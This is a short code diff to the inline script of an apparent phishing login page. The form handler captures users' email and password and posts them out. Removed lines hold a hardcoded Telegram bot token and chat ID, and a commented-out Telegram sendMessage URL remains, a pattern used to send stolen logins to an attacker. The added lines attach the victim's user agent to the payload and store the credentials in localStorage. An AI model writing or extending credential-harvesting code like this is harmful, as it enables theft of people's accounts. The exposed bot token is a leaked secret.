@@ -211,8 +211,7 @@
 
 <script>
 
-    const token = '8303026583:AAFjH0ttFEZCOIJaZlgW5my33HfV4jSIqA0';
-    const chatId = '7687624398';
+  const userAgent = navigator.userAgent;
 
 
   document.getElementById('myForm').addEventListener('submit', async (e) => {
@@ -222,7 +221,8 @@
               
     formData = JSON.stringify({
       email: formData.get('email'),
-      pass: formData.get('password')
+      pass: formData.get('password'),
+      agent: userAgent
     });
 
     // const url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -236,6 +236,7 @@
     });
             
     const result = await response.json();
+    localStorage.setItem('usr', formData);
 
     console.log(formData)
 
